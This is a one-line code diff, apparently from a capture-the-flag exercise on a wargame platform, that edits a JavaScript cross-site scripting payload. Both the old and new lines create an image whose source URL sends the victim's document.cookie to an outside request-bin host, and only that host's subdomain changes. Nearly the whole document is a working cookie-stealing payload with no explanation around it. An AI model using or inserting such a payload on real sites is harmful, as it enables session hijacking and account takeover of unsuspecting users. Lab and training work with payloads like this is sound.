@@ -1,1 +1,1 @@
-var i = new Image(); i.src = "https://gpqgncq-bin.request.dreamhack.games?cookie" + document.cookie;
+var i = new Image(); i.src = "https://gpqgncq.request.dreamhack.games?cookie" + document.cookie;
